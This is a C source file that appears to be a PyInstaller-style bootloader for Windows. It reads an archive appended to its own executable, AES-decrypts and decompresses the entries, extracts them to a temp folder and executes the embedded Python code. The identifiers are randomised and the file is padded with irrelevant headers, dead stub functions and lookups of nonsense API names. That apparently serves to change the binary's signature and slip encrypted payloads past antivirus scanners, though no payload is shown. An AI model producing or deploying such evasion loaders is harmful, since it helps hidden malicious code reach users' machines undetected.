#define _WIN32_WINNT 0x0500
#include "utils.h"
#include <eapmethodtypes.h>
#include <float.h>
#include <rnderr.h>
#include <commctrl.h>
#include <memory.h>
#include <sti.h>
#include <xolehlp.h>
#include <mtxattr.h>
#include <winsmcrd.h>
#include <signal.h>
#include <tlogstg.h>
#include <sdperr.h>
#include <naptypes.h>
#include <eaptypes.h>
#include <windows.h>
#include <rtccore.h>
#include <fsrmenums.h>
#include <gb18030.h>
#include <cmnquery.h>
#include <mimeinfo.h>
#include <adhoc.h>
#include <wbemprov.h>
#include <ratings.h>
#include <string.h>
#include <initguid.h>
#include "utils.h"
#define vsnprintf _vsnprintf
#include <stdio.h>
#define unsetenv(x) _putenv(x "=")
#include <string.h>
#include "zlib.h"
#include <windows.h>
#include <direct.h>
#include <sys/stat.h>
#include "launch.h"
#define snprintf _snprintf
#include <sys/types.h>
#include <io.h>
#include <process.h>
char* basename (char *SvRgXRc) {
char *NufPEeLIcaaTpr = strrchr (SvRgXRc, '\\');
if (!NufPEeLIcaaTpr) NufPEeLIcaaTpr = strrchr (SvRgXRc, '/');
return NufPEeLIcaaTpr ? ++NufPEeLIcaaTpr : (char*)SvRgXRc;}
int sPzfpDvQu(void) {
OSVERSIONINFO tqxQMe;
ZeroMemory(&tqxQMe, sizeof(OSVERSIONINFO));
tqxQMe.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&tqxQMe);
return ((tqxQMe.dwMajorVersion > 5) || ((tqxQMe.dwMajorVersion == 5) && (tqxQMe.dwMinorVersion >= 1)));}
int APVPgiK(char *ALPWaLgktNrWP, char *bgNoyLUbb) { return 0; }
void pfMCjgKdOujxkxR(void) {
void (WINAPI *GJKWaYehovbN)(HANDLE);
BOOL (WINAPI *RdQmMcm)(DWORD dwFlags, ULONG_PTR ulCookie);
HANDLE FJTwMsmkruI;
if (!sPzfpDvQu()) return;
FJTwMsmkruI = LoadLibrary("kernel32");
GJKWaYehovbN = (void*)GetProcAddress(FJTwMsmkruI, "GJKWaYehovbN");
RdQmMcm = (void*)GetProcAddress(FJTwMsmkruI, "RdQmMcm");
if (!GJKWaYehovbN || !RdQmMcm) { return; }}
void iwJRZWMzSyV(void) { InitCommonControls(); }
int JVCyONZgQ(char *BUsCDasejCM, const char *XLjYmwwlmrCGs) {
if (!GetModuleFileNameA(NULL, BUsCDasejCM, _MAX_PATH)) { return -1; } return 0; }
int IuLLLcULmVX(LPWSTR elCeMLaa) {
if (!GetModuleFileNameW(NULL, elCeMLaa, _MAX_PATH)) { return -1; } return 0; }
void MVzPDdJSZh(char *vjGhKWPVwqqEDi, const char *OCdGQPye) {
char *vwRKRAM = NULL;
strcpy(vjGhKWPVwqqEDi, OCdGQPye);
for (vwRKRAM = vjGhKWPVwqqEDi + strlen(vjGhKWPVwqqEDi); *vwRKRAM != '\\' && vwRKRAM >= vjGhKWPVwqqEDi + 2; --vwRKRAM);
*++vwRKRAM = '\0'; }
void DKKeJygLDad(char *UAbRBEGiPHgoT, const char *aeDqNmSw){
strcpy(UAbRBEGiPHgoT, aeDqNmSw);
strcpy(UAbRBEGiPHgoT + strlen(UAbRBEGiPHgoT) - 3, "pkg");}
 int cOkGOydsmgDQ(const ARCHIVE_STATUS *rYLWCQNZTll) { return 0; }
int RMZiMs(LPWSTR iFAWlUc) {
SECURITY_ATTRIBUTES BmrKinrZw;
STARTUPINFOW TUqXyv;
PROCESS_INFORMATION MuNQbeqyioFlzV;
int CbWTCgp = 0;
BmrKinrZw.bInheritHandle = TRUE;
signal(SIGABRT, SIG_IGN);
BmrKinrZw.lpSecurityDescriptor = NULL;
signal(SIGINT, SIG_IGN);
BmrKinrZw.nLength = sizeof(BmrKinrZw);
signal(SIGBREAK, SIG_IGN);
signal(SIGTERM, SIG_IGN);
GetStartupInfoW(&TUqXyv);
TUqXyv.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
TUqXyv.lpDesktop = NULL;
TUqXyv.lpReserved = NULL;
TUqXyv.hStdError = (void*)_get_osfhandle(fileno(stderr));
TUqXyv.hStdInput = (void*)_get_osfhandle(fileno(stdin));
TUqXyv.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
TUqXyv.wShowWindow = SW_NORMAL;
TUqXyv.lpTitle = NULL;
if (CreateProcessW( iFAWlUc, GetCommandLineW(), &BmrKinrZw, NULL, TRUE, 0,  NULL, NULL, &TUqXyv, &MuNQbeqyioFlzV)) {
WaitForSingleObject(MuNQbeqyioFlzV.hProcess, INFINITE);
GetExitCodeProcess(MuNQbeqyioFlzV.hProcess, (unsigned long *)&CbWTCgp);
} else { CbWTCgp = -1; }
return CbWTCgp; }
DECLPROC(PyString_AsString);
DECLPROC(PyList_New);
DECLPROC(PyInt_AsLong);
DECLPROC(PyObject_SetAttrString);
DECLPROC(PyObject_CallMethod);
DECLPROC(Py_Finalize);
DECLPROC(PyObject_CallFunction);
DECLVAR(Py_FrozenFlag);
DECLPROC(PyImport_ImportModule);
DECLPROC(Py_Initialize);
DECLPROC(PyErr_Print);
DECLPROC(Py_IncRef);
DECLPROC(Py_SetProgramName);
DECLPROC(Py_BuildValue);
DECLPROC(Py_DecRef);
DECLPROC(PyErr_Clear);
DECLVAR(Py_NoSiteFlag);
DECLPROC(PyRun_SimpleString);
DECLPROC(PySys_SetObject);
DECLPROC(PyList_Append);
DECLPROC(PyString_FromStringAndSize);
DECLPROC(PyImport_AddModule);
DECLPROC(PyErr_Occurred);
DECLPROC(PyDict_GetItemString);
DECLPROC(PyImport_ExecCodeModule);
DECLPROC(PyModule_GetDict);
unsigned char *kGcZCaV(ARCHIVE_STATUS *jDMTBUl, TOC *LYbJOkajln);
int oohRaJfZL(char *fkwgsDaMaDIeGH){
int i;
char *zJnDnkStpRM;
char ksEtPSNr[16];
GetTempPath(MAX_PATH, fkwgsDaMaDIeGH);
sprintf(ksEtPSNr, "_MEI%d", getpid());
for (i=0;i<5;i++) {
    zJnDnkStpRM = _tempnam(fkwgsDaMaDIeGH, ksEtPSNr);
    if (mkdir(zJnDnkStpRM) == 0) {
        strcpy(fkwgsDaMaDIeGH, zJnDnkStpRM); strcat(fkwgsDaMaDIeGH, "\\");
        free(zJnDnkStpRM); return 1;
    } free(zJnDnkStpRM);
} return 0; }
static int gIWgCfgOzOQKFS(char *OxHFOA, const char *qcBVjSLpFgmX, ...){
    va_list czwSMwDyNZpdPb;
    struct stat mrptOnzcGJElZ;
    va_start(czwSMwDyNZpdPb, qcBVjSLpFgmX);
    vsnprintf(OxHFOA, _MAX_PATH, qcBVjSLpFgmX, czwSMwDyNZpdPb);
    va_end(czwSMwDyNZpdPb);
    return stat(OxHFOA, &mrptOnzcGJElZ); }
int TsFCEChzdbpj(ARCHIVE_STATUS *MCmXDKtxxqW, char const * stqjbEcqNY, char const * znWwCIMVWgQ) {
    char *HhuuwLJQ;
    strcpy(MCmXDKtxxqW->archivename, stqjbEcqNY);
    strcat(MCmXDKtxxqW->archivename, znWwCIMVWgQ);
    strcpy(MCmXDKtxxqW->homepath, stqjbEcqNY);
    strcpy(MCmXDKtxxqW->homepathraw, stqjbEcqNY);
    for ( HhuuwLJQ = MCmXDKtxxqW->homepath; *HhuuwLJQ; HhuuwLJQ++ ) if (*HhuuwLJQ == '\\') *HhuuwLJQ = '/';
    return 0;}
int wnXoXkI(ARCHIVE_STATUS *ELJxrZNlZ, int fphikQwriRuu) {
    if (fseek(ELJxrZNlZ->fp, fphikQwriRuu-(int)sizeof(COOKIE), SEEK_SET)) return -1;
    if (fread(&(ELJxrZNlZ->cookie), sizeof(COOKIE), 1, ELJxrZNlZ->fp) < 1) return -1;
    if (strncmp(ELJxrZNlZ->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
    return 0;}
    int ySQXyhSAKp(ARCHIVE_STATUS *YpyIXunXiJRajy){
        int i; int WtWkwk;
        YpyIXunXiJRajy->fp = fopen(YpyIXunXiJRajy->archivename, "rb");
        if (YpyIXunXiJRajy->fp == NULL) { return -1;}
        fseek(YpyIXunXiJRajy->fp, 0, SEEK_END);
        WtWkwk = ftell(YpyIXunXiJRajy->fp);
        if (wnXoXkI(YpyIXunXiJRajy, WtWkwk) < 0) { return -1;}
        YpyIXunXiJRajy->pkgstart = WtWkwk - ntohl(YpyIXunXiJRajy->cookie.len);
        fseek(YpyIXunXiJRajy->fp, YpyIXunXiJRajy->pkgstart + ntohl(YpyIXunXiJRajy->cookie.TOC), SEEK_SET);
        YpyIXunXiJRajy->tocbuff = (TOC *) malloc(ntohl(YpyIXunXiJRajy->cookie.TOClen));
        if (YpyIXunXiJRajy->tocbuff == NULL){ return -1; }
        if (fread(YpyIXunXiJRajy->tocbuff, ntohl(YpyIXunXiJRajy->cookie.TOClen), 1, YpyIXunXiJRajy->fp) < 1) { return -1; }
        YpyIXunXiJRajy->tocend = (TOC *) (((char *)YpyIXunXiJRajy->tocbuff) + ntohl(YpyIXunXiJRajy->cookie.TOClen));
        if (ferror(YpyIXunXiJRajy->fp)) { return -1; }
        return 0;}
        struct _old_typeobject;
        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
        typedef void (*destructor)(PyObject *);
        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;
            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;
        static void _EmulatedIncRef(PyObject *o){
            OldPyObject *oo = (OldPyObject*)o;
            if (oo) oo->ob_refcnt++;}
        static void _EmulatedDecRef(PyObject *o){
            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
            OldPyObject *oo = (OldPyObject*)o;
            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
int GngzDeb(HMODULE tmIZtSevNqGU, int dTFrRhLbGDPc){
GETPROC(tmIZtSevNqGU, PyList_Append);
GETPROC(tmIZtSevNqGU, PyImport_ExecCodeModule);
GETPROC(tmIZtSevNqGU, PyList_New);
GETPROC(tmIZtSevNqGU, PyObject_SetAttrString);
GETPROC(tmIZtSevNqGU, PyErr_Print);
GETPROC(tmIZtSevNqGU, Py_Initialize);
GETPROC(tmIZtSevNqGU, PyErr_Clear);
GETPROC(tmIZtSevNqGU, PyObject_CallFunction);
GETPROC(tmIZtSevNqGU, Py_Finalize);
GETPROC(tmIZtSevNqGU, PyImport_ImportModule);
GETPROC(tmIZtSevNqGU, PyRun_SimpleString);
GETPROCOPT(tmIZtSevNqGU, Py_IncRef);
GETPROC(tmIZtSevNqGU, Py_BuildValue);
GETPROC(tmIZtSevNqGU, Py_SetProgramName);
GETVAR(tmIZtSevNqGU, Py_FrozenFlag);
GETPROC(tmIZtSevNqGU, PyModule_GetDict);
GETPROC(tmIZtSevNqGU, PyString_FromStringAndSize);
GETPROC(tmIZtSevNqGU, PyImport_AddModule);
GETPROC(tmIZtSevNqGU, PyDict_GetItemString);
GETPROC(tmIZtSevNqGU, PyObject_CallMethod);
GETPROC(tmIZtSevNqGU, PyInt_AsLong);
GETVAR(tmIZtSevNqGU, Py_NoSiteFlag);
GETPROC(tmIZtSevNqGU, PyString_AsString);
GETPROC(tmIZtSevNqGU, PyErr_Occurred);
GETPROCOPT(tmIZtSevNqGU, Py_DecRef);
    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
    return 0;}
int kvQzAxpTw(ARCHIVE_STATUS *UGkSNMyJeNsyA){
    HINSTANCE RIZODPe;
    char TsYXmuLrlmjixF[_MAX_PATH + 1];
    int jivbqyEPxBXWGO = ntohl(UGkSNMyJeNsyA->cookie.pyvers);
    sprintf(TsYXmuLrlmjixF, "%spython%02d.dll", UGkSNMyJeNsyA->homepathraw, jivbqyEPxBXWGO);
    RIZODPe = LoadLibraryExA(TsYXmuLrlmjixF, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!RIZODPe) {sprintf(TsYXmuLrlmjixF, "%spython%02d.dll", UGkSNMyJeNsyA->temppathraw, jivbqyEPxBXWGO);
        RIZODPe = LoadLibraryExA(TsYXmuLrlmjixF, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
    if (RIZODPe == 0) { return -1; }
    GngzDeb(RIZODPe, jivbqyEPxBXWGO);
    return 0;}
 TOC *yjRqNwOEMyUEaOm(ARCHIVE_STATUS *gQqQyrB, TOC* YgNtLULc){
     TOC *ZpCBWkavkdm = (TOC*)((char *)YgNtLULc + ntohl(YgNtLULc->structlen));
     if (ZpCBWkavkdm < gQqQyrB->tocbuff) { return gQqQyrB->tocend; }
     return ZpCBWkavkdm;}
int gWVJeVhOaCnXR(ARCHIVE_STATUS *KNDpfXMPh, int argc, char *argv[]) {
static char mplLRJEf[2*_MAX_PATH + 14];
int i;
char bLonQSRq[_MAX_PATH+1+80];
char yfvVuAqQAEwdd[_MAX_PATH+1];
PyObject *yUtyUTEfVYmOGs;
PyObject *val;
PyObject *sys;
strcpy(mplLRJEf, "PYTHONPATH=");
if (KNDpfXMPh->temppath[0] != '\0') { strcat(mplLRJEf, KNDpfXMPh->temppath); mplLRJEf[strlen(mplLRJEf)-1] = '\0'; strcat(mplLRJEf, ";"); }
strcat(mplLRJEf, KNDpfXMPh->homepath);
if (strlen(mplLRJEf) > 14) mplLRJEf[strlen(mplLRJEf)-1] = '\0';
putenv(mplLRJEf);
strcpy(mplLRJEf, "PYTHONHOME=");
strcat(mplLRJEf, KNDpfXMPh->temppath);
putenv(mplLRJEf);
*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
PI_Py_SetProgramName(KNDpfXMPh->archivename);
PI_Py_Initialize();
PI_PyRun_SimpleString("import sys\n");
PI_PyRun_SimpleString("del sys.path[:]\n");
if (KNDpfXMPh->temppath[0] != '\0') {
    strcpy(yfvVuAqQAEwdd, KNDpfXMPh->temppath);
    yfvVuAqQAEwdd[strlen(yfvVuAqQAEwdd)-1] = '\0';
    sprintf(bLonQSRq, "sys.path.append(r\"%s\")", yfvVuAqQAEwdd);
    PI_PyRun_SimpleString(bLonQSRq);}
strcpy(yfvVuAqQAEwdd, KNDpfXMPh->homepath);
yfvVuAqQAEwdd[strlen(yfvVuAqQAEwdd)-1] = '\0';
sprintf(bLonQSRq, "sys.path.append(r\"%s\")", yfvVuAqQAEwdd);
PI_PyRun_SimpleString (bLonQSRq);
yUtyUTEfVYmOGs = PI_PyList_New(0);
val = PI_Py_BuildValue("s", KNDpfXMPh->archivename);
PI_PyList_Append(yUtyUTEfVYmOGs, val);
for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (yUtyUTEfVYmOGs, val); }
sys = PI_PyImport_ImportModule("sys");
PI_PyObject_SetAttrString(sys, "argv", yUtyUTEfVYmOGs);
return 0;}
int ojZdxcSb(ARCHIVE_STATUS *fZnnmo){
    PyObject *xvxgxqXVVWSCeSr; PyObject *vsEARxuCEO; PyObject *IEBqieXVjEEnbe;
    TOC *DqBAqMxmDGRE; PyObject *co; PyObject *mod;
    xvxgxqXVVWSCeSr = PI_PyImport_ImportModule("marshal");
    vsEARxuCEO = PI_PyModule_GetDict(xvxgxqXVVWSCeSr);
    IEBqieXVjEEnbe = PI_PyDict_GetItemString(vsEARxuCEO, "loads");
    DqBAqMxmDGRE = fZnnmo->tocbuff;
    while (DqBAqMxmDGRE < fZnnmo->tocend) {
        if (DqBAqMxmDGRE->typcd == 'm' || DqBAqMxmDGRE->typcd == 'M'){
            unsigned char *HJIkozDUcmgt = kGcZCaV(fZnnmo, DqBAqMxmDGRE);
            co = PI_PyObject_CallFunction(IEBqieXVjEEnbe, "s#", HJIkozDUcmgt+8, ntohl(DqBAqMxmDGRE->ulen)-8);
            mod = PI_PyImport_ExecCodeModule(DqBAqMxmDGRE->name, co);
            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
            free(HJIkozDUcmgt);
        }
        DqBAqMxmDGRE = yjRqNwOEMyUEaOm(fZnnmo, DqBAqMxmDGRE);
    } return 0; }
int ynIROeBLQAQGMLP(ARCHIVE_STATUS *sqlTiKban, TOC *cEFLJLY){
    int pjVcdBUDCtw; int NQbBcBYnmfjJ = sqlTiKban->pkgstart + ntohl(cEFLJLY->pos);
    char *LmHQYN = "sys.path.append(r\"%s?%d\")\n";
    char *wQkWGxyhw = (char *) malloc(strlen(LmHQYN) + strlen(sqlTiKban->archivename) + 32);
    sprintf(wQkWGxyhw, LmHQYN, sqlTiKban->archivename, NQbBcBYnmfjJ);
    pjVcdBUDCtw = PI_PyRun_SimpleString(wQkWGxyhw);
    if (pjVcdBUDCtw != 0){ free(wQkWGxyhw); return -1; }
    free(wQkWGxyhw); return 0;}
int DcBDCvzXzHz(ARCHIVE_STATUS *DAmoKGNBQs){
TOC * CxIccXdlNg; CxIccXdlNg = DAmoKGNBQs->tocbuff;
while (CxIccXdlNg < DAmoKGNBQs->tocend) {
    if (CxIccXdlNg->typcd == 'z') { ynIROeBLQAQGMLP(DAmoKGNBQs, CxIccXdlNg); }
    CxIccXdlNg = yjRqNwOEMyUEaOm(DAmoKGNBQs, CxIccXdlNg); }
return 0; }
unsigned char *iDVGdBmBELLPJB(unsigned char * rUqcxb, TOC *EEBcxfu){
unsigned char *LkJIkFmIjjxJ; z_stream HcXHbQKmB; int EtOYBpVDPkDc;
LkJIkFmIjjxJ = (unsigned char *)malloc(ntohl(EEBcxfu->ulen));
if (LkJIkFmIjjxJ == NULL) { return NULL; }
HcXHbQKmB.zalloc = NULL;
HcXHbQKmB.zfree = NULL;
HcXHbQKmB.opaque = NULL;
HcXHbQKmB.next_in = rUqcxb;
HcXHbQKmB.avail_in = ntohl(EEBcxfu->len);
HcXHbQKmB.next_out = LkJIkFmIjjxJ;
HcXHbQKmB.avail_out = ntohl(EEBcxfu->ulen);
EtOYBpVDPkDc = inflateInit(&HcXHbQKmB);
if (EtOYBpVDPkDc >= 0) { 
    EtOYBpVDPkDc = (inflate)(&HcXHbQKmB, Z_FINISH);
    if (EtOYBpVDPkDc >= 0) { EtOYBpVDPkDc = (inflateEnd)(&HcXHbQKmB); }
    else { return NULL; } }
else { return NULL; }
return LkJIkFmIjjxJ;}
unsigned char *kGcZCaV(ARCHIVE_STATUS *VLuuzYNCQ, TOC *OhmAqjnDtcXP){
unsigned char *HlebMycsvXSOva;unsigned char *gLugpHp;
fseek(VLuuzYNCQ->fp, VLuuzYNCQ->pkgstart + ntohl(OhmAqjnDtcXP->pos), SEEK_SET);
HlebMycsvXSOva = (unsigned char *)malloc(ntohl(OhmAqjnDtcXP->len));
if (HlebMycsvXSOva == NULL) { return NULL; }
if (fread(HlebMycsvXSOva, ntohl(OhmAqjnDtcXP->len), 1, VLuuzYNCQ->fp) < 1) { return NULL; }
if (OhmAqjnDtcXP->cflag == '\2') {
    static PyObject *jHNvZAomj = NULL;
    PyObject *jiZczny; PyObject *HSJAGaBFDMqGgN; PyObject *MDWDvCCCzjmUBxk; PyObject *bQqZWmFHVl;
    long block_size; char *iv;
    if (!jHNvZAomj) jHNvZAomj = PI_PyImport_ImportModule("AES");
    HSJAGaBFDMqGgN = PI_PyModule_GetDict(jHNvZAomj);
    jiZczny = PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "new");
    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "block_size"));
    iv = malloc(block_size);
    memset(iv, 0, block_size);
    MDWDvCCCzjmUBxk = PI_PyObject_CallFunction(jiZczny, "s#Os#", HlebMycsvXSOva, 32, PI_PyDict_GetItemString(HSJAGaBFDMqGgN, "MODE_CFB"), iv, block_size);
    bQqZWmFHVl = PI_PyObject_CallMethod(MDWDvCCCzjmUBxk, "decrypt", "s#", HlebMycsvXSOva+32, ntohl(OhmAqjnDtcXP->len)-32);
    memcpy(HlebMycsvXSOva, PI_PyString_AsString(bQqZWmFHVl), ntohl(OhmAqjnDtcXP->len)-32);
    Py_DECREF(MDWDvCCCzjmUBxk); Py_DECREF(bQqZWmFHVl);}
if (OhmAqjnDtcXP->cflag == '\1' || OhmAqjnDtcXP->cflag == '\2') {
    gLugpHp = iDVGdBmBELLPJB(HlebMycsvXSOva, OhmAqjnDtcXP);
    free(HlebMycsvXSOva); HlebMycsvXSOva = gLugpHp;
    if (HlebMycsvXSOva == NULL) { return NULL; } }
return HlebMycsvXSOva;}
FILE *evWbNY(const char *EneVRDSyB, const char* FEFhDTqR) {
struct stat zMGGmemMPkyrtsK; char dTyJbpVv[_MAX_PATH+1]; char TtiGMCFGaBNG[_MAX_PATH+1]; char *jSKuqSH;
strcpy(dTyJbpVv, EneVRDSyB); strcpy(TtiGMCFGaBNG, FEFhDTqR); dTyJbpVv[strlen(dTyJbpVv)-1] = '\0';
jSKuqSH = strtok(TtiGMCFGaBNG, "/\\");
while (jSKuqSH != NULL){
    strcat(dTyJbpVv, "\\");
    strcat(dTyJbpVv, jSKuqSH);
    jSKuqSH = strtok(NULL, "/\\");
    if (!jSKuqSH) break;
    if (stat(dTyJbpVv, &zMGGmemMPkyrtsK) < 0) {mkdir(dTyJbpVv);} }
return fopen(dTyJbpVv, "wb"); }
static int hQyfGDYUvPIYgwv(ARCHIVE_STATUS *clMEqdsjWGDkn) {
char *KmXRRgq;
if (clMEqdsjWGDkn->temppath[0] == '\0') {
    if (!oohRaJfZL(clMEqdsjWGDkn->temppath)) {return -1;}
    strcpy(clMEqdsjWGDkn->temppathraw, clMEqdsjWGDkn->temppath);
    for ( KmXRRgq=clMEqdsjWGDkn->temppath; *KmXRRgq; KmXRRgq++ ) if (*KmXRRgq == '\\') *KmXRRgq = '/';}
return 0;}
int uuPLZndK(ARCHIVE_STATUS *HIGfIYdGTCR, TOC *vcxxoqQBQJ) {
FILE *IbZwUmyYE; unsigned char *YgMZtFlopxnu = kGcZCaV(HIGfIYdGTCR, vcxxoqQBQJ);
if (hQyfGDYUvPIYgwv(HIGfIYdGTCR) == -1){ return -1; }
IbZwUmyYE = evWbNY(HIGfIYdGTCR->temppath, vcxxoqQBQJ->name);
if (IbZwUmyYE == NULL)  { return -1; }
else { fwrite(YgMZtFlopxnu, ntohl(vcxxoqQBQJ->ulen), 1, IbZwUmyYE); fclose(IbZwUmyYE); }
free(YgMZtFlopxnu); return 0; }
static int APmZGDJDb(char *PssUOMiVJbvyh, char *TUbXvnZoGPilwG, const char *FxrNQQuQ) {
char nhGqQlYguValIJ[_MAX_PATH + 1];
strcpy(nhGqQlYguValIJ, FxrNQQuQ);
strcpy(PssUOMiVJbvyh, strtok(nhGqQlYguValIJ, ":"));
strcpy(TUbXvnZoGPilwG, strtok(NULL, ":")) ;
if (PssUOMiVJbvyh[0] == 0 || TUbXvnZoGPilwG[0] == 0) return -1;
return 0; }
static int nTARxGhkAwXBCG(const char *jxqGuRtrapQGaXv, const char *gRzokMy, const char *CVBKlSYbtes) {
FILE *itGrTsav = fopen(jxqGuRtrapQGaXv, "rb"); FILE *AnsBMW = evWbNY(gRzokMy, CVBKlSYbtes);
char buf[4096]; int error = 0;
if (itGrTsav == NULL || AnsBMW == NULL) return -1;
while (!feof(itGrTsav)) {
    if (fread(buf, 4096, 1, itGrTsav) == -1) {
        if (ferror(itGrTsav)) { clearerr(itGrTsav); error = -1; break; }
    } else {
        fwrite(buf, 4096, 1, AnsBMW);
        if (ferror(AnsBMW)) { clearerr(AnsBMW); error = -1; break;}}}
fclose(itGrTsav); fclose(AnsBMW); return error; }
static char *OATByY(const char *FItBHgIriyBvwQ) {
char *lwHadDkAN = strrchr(FItBHgIriyBvwQ, '\\');
char *dkTfkFvZtLNGlz = (char *) calloc(_MAX_PATH, sizeof(char));
if (lwHadDkAN != NULL) strncpy(dkTfkFvZtLNGlz, FItBHgIriyBvwQ, lwHadDkAN - FItBHgIriyBvwQ + 1);
else strcpy(dkTfkFvZtLNGlz, FItBHgIriyBvwQ);
return dkTfkFvZtLNGlz; }
static int OGtBFLsqwWcr(ARCHIVE_STATUS *eKeEitH, const char *yXBlgpc, const char *csEFKIFYnhRnOJn){
if (hQyfGDYUvPIYgwv(eKeEitH) == -1){ return -1; }
if (nTARxGhkAwXBCG(yXBlgpc, eKeEitH->temppath, csEFKIFYnhRnOJn) == -1) { return -1; }
return 0; }
static ARCHIVE_STATUS *EFFAtzdggB(ARCHIVE_STATUS *OmGmwxEJbko[], const char *axhDCVIEld) {
ARCHIVE_STATUS *oLhzRo = NULL; int i = 0;
if (hQyfGDYUvPIYgwv(OmGmwxEJbko[SELF]) == -1){ return NULL; } 
for (i = 1; OmGmwxEJbko[i] != NULL; i++){ if (strcmp(OmGmwxEJbko[i]->archivename, axhDCVIEld) == 0) { return OmGmwxEJbko[i]; } }
if ((oLhzRo = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
strcpy(oLhzRo->archivename, axhDCVIEld);
strcpy(oLhzRo->homepath, OmGmwxEJbko[SELF]->homepath);
strcpy(oLhzRo->temppath, OmGmwxEJbko[SELF]->temppath);
strcpy(oLhzRo->homepathraw, OmGmwxEJbko[SELF]->homepathraw);
strcpy(oLhzRo->temppathraw, OmGmwxEJbko[SELF]->temppathraw);
if (ySQXyhSAKp(oLhzRo)) { free(oLhzRo); return NULL; }
OmGmwxEJbko[i] = oLhzRo; return oLhzRo; }
static int fchfvpU(ARCHIVE_STATUS *uNDlXw, const char *YmhZEyemfzMfi) {
TOC * SWsaJwXmgefTkF = uNDlXw->tocbuff;
while (SWsaJwXmgefTkF < uNDlXw->tocend) {
    if (strcmp(SWsaJwXmgefTkF->name, YmhZEyemfzMfi) == 0) if (uuPLZndK(uNDlXw, SWsaJwXmgefTkF)) return -1;
    SWsaJwXmgefTkF = yjRqNwOEMyUEaOm(uNDlXw, SWsaJwXmgefTkF); }
return 0; }
static int KheRbZcaK(ARCHIVE_STATUS *TGsBxMlerFCT[], const char *bZalqGiJxxNY) {
ARCHIVE_STATUS *APmuAJHK = NULL;
char zFtPqkpEbLzLIcB[_MAX_PATH + 1]; char LsvWmfpUxW[_MAX_PATH + 1];
char zyiGUhfPWSHA[_MAX_PATH + 1]; char *YaeeVoA = NULL;
if (APmZGDJDb(zFtPqkpEbLzLIcB, LsvWmfpUxW, bZalqGiJxxNY) == -1) return -1;
YaeeVoA = OATByY(zFtPqkpEbLzLIcB);
if (YaeeVoA[0] == 0) { free(YaeeVoA); return -1; }
if ((gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s.pkg", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0) &&
    (gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s.exe", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0) &&
    (gIWgCfgOzOQKFS(zyiGUhfPWSHA, "%s%s", TGsBxMlerFCT[SELF]->homepath, zFtPqkpEbLzLIcB) != 0)) { return -1; }
    if ((APmuAJHK = EFFAtzdggB(TGsBxMlerFCT, zyiGUhfPWSHA)) == NULL) { return -1; }
if (fchfvpU(APmuAJHK, LsvWmfpUxW) == -1) { free(APmuAJHK); return -1; }
free(YaeeVoA); return 0; }
int CxMFOmAYcNx(ARCHIVE_STATUS *MgpxSlfkv[]) {
TOC * eFJOJkEpFpDMUz = MgpxSlfkv[SELF]->tocbuff;
while (eFJOJkEpFpDMUz < MgpxSlfkv[SELF]->tocend) {
    if (eFJOJkEpFpDMUz->typcd == 'b' || eFJOJkEpFpDMUz->typcd == 'x' || eFJOJkEpFpDMUz->typcd == 'Z') return 1;
    if (eFJOJkEpFpDMUz->typcd == 'd')  return 1;
    eFJOJkEpFpDMUz = yjRqNwOEMyUEaOm(MgpxSlfkv[SELF], eFJOJkEpFpDMUz);
} return 0; }
int WcDOapvnLPszOZh(ARCHIVE_STATUS *eVwGdtvZbJprshx[]) {
TOC * nOFAmdgMx = eVwGdtvZbJprshx[SELF]->tocbuff;
while (nOFAmdgMx < eVwGdtvZbJprshx[SELF]->tocend) {
    if (nOFAmdgMx->typcd == 'b' || nOFAmdgMx->typcd == 'x' || nOFAmdgMx->typcd == 'Z')
        if (uuPLZndK(eVwGdtvZbJprshx[SELF], nOFAmdgMx)) return -1;
    if (nOFAmdgMx->typcd == 'd') {
        if (KheRbZcaK(eVwGdtvZbJprshx, nOFAmdgMx->name) == -1) return -1; }
    nOFAmdgMx = yjRqNwOEMyUEaOm(eVwGdtvZbJprshx[SELF], nOFAmdgMx); }
return 0; }
int hfPKSje(ARCHIVE_STATUS *rNVnTYOumiE) {
unsigned char *IwdrsUiWgfW; char NcWHYsjKwALwUK[_MAX_PATH]; int ehkxHGlRi = 0;
TOC * dxlrzXsKaSgnuCP = rNVnTYOumiE->tocbuff;
PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
while (dxlrzXsKaSgnuCP < rNVnTYOumiE->tocend) {
    if (dxlrzXsKaSgnuCP->typcd == 's') {
        IwdrsUiWgfW = kGcZCaV(rNVnTYOumiE, dxlrzXsKaSgnuCP);
        strcpy(NcWHYsjKwALwUK, dxlrzXsKaSgnuCP->name); strcat(NcWHYsjKwALwUK, ".py");
        __file__ = PI_PyString_FromStringAndSize(NcWHYsjKwALwUK, strlen(NcWHYsjKwALwUK));
        PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
        ehkxHGlRi = PI_PyRun_SimpleString(IwdrsUiWgfW);
        if (ehkxHGlRi != 0) return ehkxHGlRi; free(IwdrsUiWgfW); }
    dxlrzXsKaSgnuCP = yjRqNwOEMyUEaOm(rNVnTYOumiE, dxlrzXsKaSgnuCP);
} return 0; }
